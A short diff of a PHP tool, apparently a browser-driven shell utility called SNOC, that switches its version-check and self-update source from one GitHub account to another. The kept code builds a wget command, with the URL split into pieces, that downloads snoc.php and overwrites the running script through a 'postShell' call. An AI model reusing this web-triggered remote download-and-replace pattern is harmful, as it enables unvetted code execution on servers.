@@ -80,7 +80,7 @@ function doVersionCheck()
 	$versionString = false;
 	// we open a socket because we have no guarantee that file_get_conents is enabled
 	$f = fsockopen('ssl://raw.github.com', 443);
-	$request = "GET /tjosten/SNOC/master/version.json HTTP/1.1\r\n";
+	$request = "GET /stetro/SNOC/master/version.json HTTP/1.1\r\n";
 	$request.= "Host: raw.github.com\r\n";
 	$request.= "Connection: Close\r\n\r\n";
 	fwrite($f, $request);
@@ -97,9 +97,6 @@ function doVersionCheck()
 	else
 		die($versionString);
 
-	#'https://raw.github.com/tjosten/SNOC/master/version.json';
-	#var_dump($version);
-	#echo $version;
 }
 
 /**
@@ -422,7 +419,7 @@ function echoJS()
 			console.log(current_dir+"/test-"+self_name);
 			//return;
 			lolWAS = 'https:/';
-			command = "wget '"+lolWAS+"/raw.github.com/tjosten/SNOC/master/snoc.php' -O "+current_dir+"/"+self_name;
+			command = "wget '"+lolWAS+"/raw.github.com/stetro/SNOC/master/snoc.php' -O "+current_dir+"/"+self_name;
 			var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
 			postShell(fullcommand,function(data){
 				for(var i=data.length-3;i>0;i--) {
